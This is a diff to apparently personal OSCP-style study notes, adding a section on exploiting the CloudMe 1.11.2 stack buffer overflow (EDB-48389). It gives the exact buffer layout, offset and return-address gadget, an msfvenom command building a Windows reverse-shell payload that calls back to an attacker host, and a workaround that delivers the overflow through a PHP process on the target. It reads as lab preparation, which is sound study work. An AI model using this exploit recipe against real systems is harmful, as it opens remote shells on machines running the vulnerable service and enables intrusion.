@@ -62,6 +62,36 @@ See [[14. Fixing Exploits#Module Exercise VM #3: Unknown service, memory corrupt
 
 ---
 
+## CloudMe 1.11.2 — fixed-layout TCP overflow
+
+EDB-48389 provides a tested packet layout for the 32-bit CloudMe 1.11.2
+service:
+
+~~~text
+1052 bytes padding + 0x68A842B5 + 30 NOP bytes + shellcode + C padding = 1500 bytes
+~~~
+
+The return address is PUSH ESP; RET in Qt5Core.dll. Generate x86 shellcode
+even when systeminfo reports an x64 operating system:
+
+~~~bash
+msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp \
+  LHOST=$LocalIP LPORT=$Port EXITFUNC=thread \
+  -b "\x00\x0a\x0d" -f raw -o $BoxDir/exploits/cloudme-shellcode.bin
+~~~
+
+If the service restarts after the buffer but no callback arrives, first verify
+that the offset and gadget are unchanged. Then move the delivery into a
+target-side PHP process: decode base64 shellcode chunks, build the buffer with
+chr(0x90) and pack("V", 0x68A842B5), and send it to 127.0.0.1:8888 with
+fsockopen. This separates a correct overflow from a blocked PowerShell or
+dropped-executable wrapper.
+
+See [[RUNBOOK V2/Windows - Remote - CloudMe Buffer Overflow]] and
+[[OSCP/BOXES/WRITE UPS/Windows/Buff|Buff]].
+
+#### Tags: #CloudMe #EDB48389 #StackOverflow #X86 #PUSHESP #ShellcodeDelivery
+
 ## **Outstanding**
 This area grows alongside the module. A genuine from-scratch offset/bad-char/return-address discovery workflow (local debugger + mona.py) is the obvious next addition once a BOF box actually requires deriving these rather than reusing a public exploit's own research.
 ## External Resources
